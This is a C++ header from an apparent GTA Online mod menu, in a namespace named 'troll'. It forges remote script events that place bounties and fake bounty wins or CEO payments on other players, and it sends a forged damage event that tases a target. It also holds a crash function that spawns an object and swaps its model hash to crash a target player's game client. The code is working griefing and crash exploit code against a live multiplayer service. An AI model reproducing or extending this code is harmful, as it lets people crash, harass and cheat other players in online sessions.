#pragma once
#include "core/scr_globals.hpp"
#include "gta/enums.hpp"
#include "pointers.hpp"
#include "script_global.hpp"
#include "services/players/player_service.hpp"

#include <script/globals/GPBD_FM_3.hpp>
#include "model_info.hpp"
#include "util/entity.hpp"
#include "fiber_pool.hpp"

namespace big::troll
{
	inline void set_bounty_on_player(player_ptr target, int value, bool anonymous)
	{
		const size_t arg_count  = 23;
		int64_t args[arg_count] = {(int64_t)eRemoteEvent::Bounty,
		    self::id,
		    -1,
		    target->id(),
		    1,
		    value,
		    0,
		    anonymous ? 1 : 0,
		    0,
		    0,
		    0,
		    0,
		    0,
		    0,
		    0,
		    0,
		    0,
		    0,
		    0,
		    0,
		    0,
		    *scr_globals::gsbd_fm_events.at(9).as<int*>(),
		    *scr_globals::gsbd_fm_events.at(10).as<int*>()};

		g_pointers->m_gta.m_trigger_script_event(1, args, arg_count, -1, (int)eRemoteEvent::Bounty);
	}

	inline void win_bounty_on_player(player_ptr target, int value, bool sent_to_all)
	{
		scr_globals::gpbd_fm_3.as<GPBD_FM_3*>()->Entries[self::id].BountyAmount   = value;
		scr_globals::gpbd_fm_3.as<GPBD_FM_3*>()->Entries[self::id].BountyPlacedBy = target->id();

		const size_t arg_count  = 23;
		int64_t args[arg_count] = 
		{(int64_t)eRemoteEvent::WinBounty,
		    self::id,         
		    -1,
		    target->id(),
		    1, 
		    value,
		    0,
		    0,
		    0,
		    0,
		    0,
		    0,
		    0,
		    0,
		    0,
		    0,
		    0,
		    0,
		    0,
		    0,
		    0,
		    *scr_globals::gsbd_fm_events.at(9).as<int*>(), 
		    *scr_globals::gsbd_fm_events.at(10).as<int*>()}; 

		//all
		if (sent_to_all)
		{
			g_pointers->m_gta.m_trigger_script_event(1, args, arg_count, -1, (int)eRemoteEvent::WinBounty);
		}
		else		
		//target player
		g_pointers->m_gta.m_trigger_script_event(1, args, arg_count, 1 << target->id(), (int)eRemoteEvent::WinBounty);
		
	}
	
	inline void ceo_payement(player_ptr target, int value, bool sent_to_all)
	{
		scr_globals::gpbd_fm_3.as<GPBD_FM_3*>()->Entries[self::id].BountyAmount   = value;
		scr_globals::gpbd_fm_3.as<GPBD_FM_3*>()->Entries[self::id].BountyPlacedBy = target->id();		
		//scr_globals::gpbd_fm_3.as<GPBD_FM_3*>()->Entries[self::id].at(511).as<int*>() = target->id();
		//int ceo_paye_global     = *script_global(1886967).at(target->id(), 609).at(511).as<int*>();
		const size_t arg_count  = 9;
		int64_t args[arg_count] = {(int64_t)eRemoteEvent::CeoMoney,
		    self::id,
		    -1, //target->id() ??
		    value,
		    198210293, //198210293  1553945504
			1,//1
		    *script_global(1886967).at(target->id(), 609).at(511).as<int*>(),		    
		    *scr_globals::gsbd_fm_events.at(9).as<int*>(),
		    *scr_globals::gsbd_fm_events.at(10).as<int*>()};

		//all
		if (sent_to_all)
		{
		g_pointers->m_gta.m_trigger_script_event(1, args, arg_count, -1, (int)eRemoteEvent::WinBounty);
		}
		else
		//target player
		g_pointers->m_gta.m_trigger_script_event(1, args, arg_count, 1 << target->id(), (int)eRemoteEvent::WinBounty);
	}
	inline void ceo_payement_2(player_ptr target, int value, bool sent_to_all)
	{
		scr_globals::gpbd_fm_3.as<GPBD_FM_3*>()->Entries[self::id].BountyAmount   = value;
		scr_globals::gpbd_fm_3.as<GPBD_FM_3*>()->Entries[self::id].BountyPlacedBy = target->id();
		//scr_globals::gpbd_fm_3.as<GPBD_FM_3*>()->Entries[self::id].at(511).as<int*>() = target->id();
		//int ceo_paye_global     = *script_global(1886967).at(target->id(), 609).at(511).as<int*>();
		const size_t arg_count  = 9;
		int64_t args[arg_count] = {(int64_t)eRemoteEvent::CeoMoney,
		    self::id,
		    target->id(), //target->id() ??
		    value,
		    198210293, //198210293  1553945504
		    1,         //1
		    *script_global(1886967).at(target->id(), 609).at(511).as<int*>(),
		    *scr_globals::gsbd_fm_events.at(9).as<int*>(),
		    *scr_globals::gsbd_fm_events.at(10).as<int*>()};

		//all
		if (sent_to_all)
		{
		g_pointers->m_gta.m_trigger_script_event(1, args, arg_count, -1, (int)eRemoteEvent::WinBounty);
		}
		else
		//target player
		g_pointers->m_gta.m_trigger_script_event(1, args, arg_count, 1 << target->id(), (int)eRemoteEvent::WinBounty);
	}
	inline void ceo_payement_3(player_ptr target, int value, bool sent_to_all)
	{
		scr_globals::gpbd_fm_3.as<GPBD_FM_3*>()->Entries[self::id].BountyAmount   = value;
		scr_globals::gpbd_fm_3.as<GPBD_FM_3*>()->Entries[self::id].BountyPlacedBy = target->id();
		//scr_globals::gpbd_fm_3.as<GPBD_FM_3*>()->Entries[self::id].at(511).as<int*>() = target->id();
		//int ceo_paye_global     = *script_global(1886967).at(target->id(), 609).at(511).as<int*>();
		const size_t arg_count  = 9;
		int64_t args[arg_count] = {(int64_t)eRemoteEvent::CeoMoney,
		    self::id,
		    0, //target->id() ??
		    value,
		    198210293, //198210293  1553945504
		    1,         //1
		    *script_global(1886967).at(target->id(), 609).at(511).as<int*>(),
		    *scr_globals::gsbd_fm_events.at(9).as<int*>(),
		    *scr_globals::gsbd_fm_events.at(10).as<int*>()};

		//all
		if (sent_to_all)
		{
		g_pointers->m_gta.m_trigger_script_event(1, args, arg_count, -1, (int)eRemoteEvent::WinBounty);
		}
		else
		//target player
		g_pointers->m_gta.m_trigger_script_event(1, args, arg_count, 1 << target->id(), (int)eRemoteEvent::WinBounty);
	}

	//WEAPON_DAMAGE_EVENT
	inline void tazze_player(player_ptr target)
	{
		if (CPed* Cped_target = target->get_ped())
		{
			CPed* local_ped = g_player_service->get_self()->get_ped();

			rage::fvector3 local_pos{};
			uint8_t hitComponent         = 0;
			bool overrideDefaultDamage   = true;
			uint32_t weaponhash          = 1171102963;
			uint32_t weaponDamage        = 0;
			uint8_t tyreIndex            = 1;
			uint8_t suspensionIndex      = 1;
			uint32_t damageFlags         = 540688;
			uint32_t actionResultName    = 0;
			uint16_t actionResultId      = 0;
			uint32_t f104                = 0;
			bool hitEntityWeapon         = false;
			bool hitWeaponAmmoAttachment = false;
			bool silenced                = false;

			g_pointers->m_gta.m_send_network_damage(local_ped,
			    Cped_target,
				(rage::fvector3*)&local_pos,
				hitComponent,
				overrideDefaultDamage,
				weaponhash,
				weaponDamage,
				tyreIndex,
				suspensionIndex,
				damageFlags,
				actionResultName,
				actionResultId,
				f104,
				hitEntityWeapon,
				hitWeaponAmmoAttachment,
				silenced,
				false,
			    Cped_target->m_navigation->get_position());
		}
	}

	inline void crash_invalid_model_hash(player_ptr target, int target_id)
	{
		//big::g_fiber_pool->queue_job([target]()
		//{
			if (CPed* Cped_target = target->get_ped())
			{
				//CPed* local_ped = Cped_target->get_self()->get_ped();
			//rage::fvector3 fcoords = *Cped_target->m_navigation->get_position();
			//Vector3 coords         = {fcoords.x, fcoords.y, fcoords.z};
				Vector3 coords         = *Cped_target->m_navigation->get_position();
            
				//Vector3 coords = Cped_target->get_bone_coords(ePedBoneType::HEAD);

				Hash hash = "prop_alien_egg_01"_J;
				//Hash hash     = "prop_thindesertfiller_aa"_J;
				auto info     = model_info::get_model(hash);
				Object object = entity::spawn_object_crash(hash, coords, (int)target_id);
				if (object != NULL)
				{
					info->m_hash = "prop_thindesertfiller_aa"_J;
					// info->m_hash = "proc_leafybush_01"_J;
					script::get_current()->yield(1s);
					entity::delete_entity(object, true);
					info->m_hash = hash;
					//entity::delete_entity(object, true);
					//g_notification_service.push_crash_success("CRASH_INVALID_MODEL_HASH_MESSAGE"_T.data());
				}
			}
		//});
	}
}







//static void crash_player(player_ptr target_player)
//{
//	big::g_fiber_pool->queue_job([target_player, crash_id]() {
//		uint8_t target_pid    = target_player->id();
//		Ped target_ped        = PLAYER::GET_PLAYER_PED(target_pid);
//		Vector3 target_coords = ENTITY::GET_ENTITY_COORDS(target_ped, false);
//
//		target_player->block_packing_clone_remove = true;
//
//		crash_invalid_model_type(target_coords);
//
//		target_player->block_packing_clone_remove = false;
//	});
//}
//components::button("Invalid Model Hash", [current_player] {
//	crash_player(current_player);
//});
